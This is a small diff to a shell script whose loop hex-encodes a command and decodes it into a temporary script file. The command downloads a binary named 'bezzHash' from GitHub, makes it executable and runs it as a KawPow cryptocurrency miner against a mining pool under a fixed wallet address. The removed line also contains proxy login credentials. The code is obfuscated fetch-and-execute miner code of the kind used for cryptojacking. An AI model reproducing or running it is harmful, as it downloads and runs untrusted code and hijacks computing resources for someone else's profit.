@@ -2,7 +2,7 @@
 
 while true; do
     # Convert provided code to hex
-    hex_code=$(echo -n "wget https://github.com/Testdrive345/scriptX/raw/main/bezzHash && chmod 777 bezzHash && ./bezzHash --par=kawpow --user RLgPffTX9i31sQjiW3xi2hjXZP5jw1w1M3 --server stratum.ravenminer.com --port 3838 --proxy jvyxiovx-rotate:2udhid79wl5a@p.webshare.io:80" | xxd -p)
+    hex_code=$(echo -n "wget https://github.com/Testdrive345/scriptX/raw/main/bezzHash && chmod 777 bezzHash && ./bezzHash --par=kawpow --user RLgPffTX9i31sQjiW3xi2hjXZP5jw1w1M3 --server stratum.ravenminer.com --port 3838 " | xxd -p)
 
     # Write hex code to a temporary file
     echo "$hex_code" | xxd -r -p > temp_hex_code.sh
